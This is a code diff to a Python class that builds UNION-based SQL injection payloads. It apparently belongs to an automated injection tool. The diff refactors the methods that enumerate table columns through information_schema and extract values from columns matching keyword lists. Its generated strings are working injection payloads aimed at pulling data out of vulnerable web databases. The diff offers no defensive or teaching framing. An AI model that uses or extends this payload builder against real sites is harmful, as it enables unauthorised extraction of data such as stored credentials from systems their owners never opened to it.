@@ -49,7 +49,6 @@ class Builder:
     def union(self, num_cols, visible_num):
         """ :num_cols:  Number of columns for UNION statement.
             :visible_num: Column number that is most visible, and therefore used for injection parameter.
-            :i_type:    Injection type. String or int?
             :returns:   Dict of strings. All basic union-based injections.
         """
         injections = {}
@@ -77,13 +76,13 @@ class Builder:
         return injections 
 
     
-    def columns(self, num_cols, visible_num, tables):
+    def columns(self, table, num_cols, visible_num):
         """ Build SQLI to get columns of all specified tables.
             Default behavior parses list of tables for those that has specific sub-strings.
-            :num_cols:  Number of columns for UNION statement.
-            :visible_num: Column number that is most visible, and therefore used for injection parameter.
-            :tables:    List of tables to get columns for.
-            :returns:   Dict of strings->strings. Key table_name, value SQLi for columns.
+            :table:         String representing table name. 
+            :num_cols:      Number of columns for UNION statement.
+            :visible_num:   Column number that is most visible, and therefore used for injection parameter.
+            :returns:       Dict of strings->strings. Key table_name, value SQLi for columns.
         """
 
         injections = {}
@@ -93,30 +92,28 @@ class Builder:
         a += self.delimiter + 'from' + self.delimiter + 'information_schema.columns'
         a += self.delimiter + 'where' + self.delimiter + 'table_name='
         
-        for table in tables:
-            if any(i in str(table).lower() for i in self.table_keywords):
-                injections[table] = a + "'" + table + "'"
+        if any(i in str(table).lower() for i in self.table_keywords):
+            injections[table] = a + "'" + table + "'"
 
         return injections
 
-    def rows(self, num_cols, visible_num, table, columns):
+    def rows(self, table, column, num_cols, visible_num):
         """ Build SQLI to get values of each column in a specified table.
             Default behavior only returns queries about columns in self.column_keywords.
-            :num_cols:      Number of columns for UNION statement.
-            :visible_num:     Column number that is most visible, and therefore used for injection parameter.
             :table:         String representing table name.
-            :columns:       List of column names in table.
+            :column:        String representing columns name.
+            :num_cols:      Number of columns for UNION statement.
+            :visible_num:   Column number that is most visible, and therefore used for injection parameter.
             :returns:       Dict of strings->strings with queries regarding table's columns.
         """
 
         injections = {}
         union_urls = [self.delimiter + str(i + self.offset) for i in xrange(1, num_cols + 1)]
 
-        for column in columns:
-            if any(i in str(column).lower() for i in self.column_keywords):
-                union_urls[visible_num - 1] = self.delimiter + column
-                injections[column] = self.null_url + self.union_string + ','.join(union_urls)
-                injections[column] += self.delimiter + 'from' + self.delimiter + table
+        if any(i in str(column).lower() for i in self.column_keywords):
+            union_urls[visible_num - 1] = self.delimiter + column
+            injections[column] = self.null_url + self.union_string + ','.join(union_urls)
+            injections[column] += self.delimiter + 'from' + self.delimiter + table
 
         return injections 
 
